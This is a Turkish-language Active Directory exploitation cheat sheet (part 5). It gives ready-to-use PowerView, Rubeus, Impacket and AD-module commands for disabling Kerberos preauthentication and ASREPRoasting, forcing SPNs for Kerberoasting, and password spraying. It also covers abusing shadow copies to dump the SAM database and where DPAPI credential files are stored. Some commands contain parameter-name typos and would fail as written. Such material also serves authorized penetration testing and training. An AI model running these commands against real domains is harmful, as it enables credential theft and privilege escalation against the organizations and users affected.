# Active Directory Exploitation Cheat Sheet - Bölüm 5

## Kerberos Preauth Zorla Devre Dışı Bırakma

### Hesap Üzerinde Yazma İzni ile İşlem Yapma

#### PowerView Kullanımı:
- **Hesaplarda İlginç İzinleri Kontrol Etme:**
  ```powershell
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  ```

- **Kerberos Preauth Devre Dışı Bırakma:**
  ```powershell
  Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
  ```

- **Değerin Değiştiğini Kontrol Etme:**
  ```powershell
  Get-DomainUser -PreauthNotRequired -Verbose
  ```

- **ASREPRoast ile Saldırıyı Gerçekleştirme:**
  ```powershell
  # Belirli Bir Hesabın Hash'ini Al
  Get-ASREPHash -UserName <UserName> -Verbose

  # ASREPRoast ile Uygun Kullanıcıların Hash'lerini Al
  Invoke-ASREPRoast -Verbose
  ```

#### Rubeus Kullanımı:
- **Tüm Domain Kullanıcıları İçin Saldırı:**
  ```bash
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- **Belirli Bir Kullanıcıya Saldırı:**
  ```bash
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- **Belirli Bir OU İçin Saldırı:**
  ```bash
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

#### Impacket Kullanımı:
- **Belirli Kullanıcılar İçin Saldırı:**
  ```bash
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```

## Password Spray Saldırısı

- **Açıklama:** Eğer bir kullanıcı hesabını ele geçirerek bazı şifreler elde ettiyseniz, bu yöntemi diğer domain hesaplarında şifre tekrar kullanımını istismar etmek için kullanabilirsiniz.

### Araçlar:
- **DomainPasswordSpray**
- **CrackMapExec**
- **Invoke-CleverSpray**
- **Spray**

## SPN Zorla Ayarlama

### Açıklama:
- **Eğer Yeterli İzinlere Sahipseniz:** GenericAll veya GenericWrite yetkileri ile bir hedef hesap üzerinde SPN ayarlayıp, bir TGS isteyerek blob'u alabilir ve brute-force ile şifresini kırabilirsiniz.

#### PowerView Kullanımı:
- **Hesaplarda İlginç İzinleri Kontrol Etme:**
  ```powershell
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  ```

- **Mevcut SPN Ayarlarını Kontrol Etme:**
  ```powershell
  Get-DomainUser -Identity <UserName> | select serviceprincipalname
  ```

- **SPN Zorla Ayarlama:**
  ```powershell
  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```

#### AD Modülü Kullanımı:
- **Mevcut SPN Ayarlarını Kontrol Etme:**
  ```powershell
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
  ```

- **SPN Zorla Ayarlama:**
  ```powershell
  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```

### Hash Almak ve Kerberoast Yapmak:
Daha önceki araçlardan herhangi birini kullanabilirsiniz.

## Shadow Copies Suistimali

### Açıklama:
- Eğer bir makinede yerel yönetici erişiminiz varsa, shadow copy'leri listelemek domain yetkisi yükseltme için kolay bir yöntemdir.

#### Shadow Copy Listeleme:
- **vssadmin Kullanımı:**
  ```bash
  vssadmin list shadows
  ```

- **diskshadow Kullanımı:**
  ```bash
  diskshadow list shadows all
  ```

- **Shadow Copy'ye Sembolik Link Oluşturma ve Erişim Sağlama:**
  ```bash
  mklink /d c:\shadowcopy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
  ```

- **Yapabilecekleriniz:**
  - Yedeklenmiş SAM veritabanını dump ederek kimlik bilgilerini elde edebilirsiniz.
  - DPAPI ile şifrelenmiş kimlik bilgilerini arayıp çözebilirsiniz.
  - Yedeklenmiş hassas dosyalara erişebilirsiniz.

## Mimikatz ile Kimlik Bilgilerini Listeleme ve Şifre Çözme

- **Genelde Şifrelenmiş Kimlik Bilgilerinin Saklandığı Yerler:**
  - `%appdata%\Microsoft\Credentials`
  - `%localappdata%\Microsoft\Credentials`
